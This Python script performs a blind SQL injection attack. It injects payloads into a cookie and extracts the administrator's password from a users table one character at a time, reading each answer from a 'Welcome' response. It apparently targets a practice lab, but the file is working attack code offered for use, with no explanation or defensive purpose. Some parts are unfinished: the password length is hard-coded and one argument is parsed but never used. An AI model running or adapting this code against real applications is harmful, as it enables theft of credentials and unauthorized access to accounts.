import myIntruder, sys, re, string

#Only for username password brute force sqli

# Source of SQLI
# data / param / cookie
# Name of source
# ex: categories

class BruteForce():
    
    def __init__(self, args):
        self.intruder = myIntruder.MyIntruder('req.txt')

        self.source = ""
        self.nameSource = ""
        self.username = ""
        self.targetMessage = ""

        self.parseArguments(args)

        self.passwordLength = 20#self.getPassLength()
        self.password = self.getPassword()

    def parseArguments(self, args):
        i = 0
        while i < len(args):
            if (args[i] == "-u"):
                self.username = args[i+1]
            elif (args[i] == "-s"):
                self.source = args[i+1]
            elif (args[i] == "-n"):
                self.nameSource = args[i+1]
            elif (args[i] == '-m'):
                self.targetMessage = args[i+1]
            else:
                print("Error:",args[i])
                exit()
            i += 2

    def sendPayload(self,payload):
        if(self.source == 'cookie'):
            content = self.intruder.headers['Cookie']
            value = re.search(self.nameSource+'=(.*);',content).group(1)
            content = content.replace(value,payload)
            self.intruder.headers['Cookie'] = content
        response = self.intruder.sendRequest()
        return response

    def getPassLength(self):
        length = 0

        while True:
            payload = "' OR (SELECT length(password) FROM users WHERE username='administrator') = "+str(length)+'-- -'
            response = self.sendPayload(payload)
            if (self.intruder.checkResponse(response, 'Welcome')):
                print(f'Password length is {length}.')
                return length
            length += 1

    def getPassword(self):
        password = ""
        alphabet = string.ascii_letters + string.digits 
        payload = "' OR (SELECT substring(password,%s,1) FROM users WHERE username='administrator') = '%s'-- -"
        for i in range(self.passwordLength):
            for c in alphabet:
                response = self.sendPayload(payload % (str(i + 1), c))
                if (self.intruder.checkResponse(response, 'Welcome')):
                    password += c
                    print('Found: '+password)
                    break
        return password





if __name__ == "__main__":
    args = sys.argv[1:]
    myBrute = BruteForce(args)
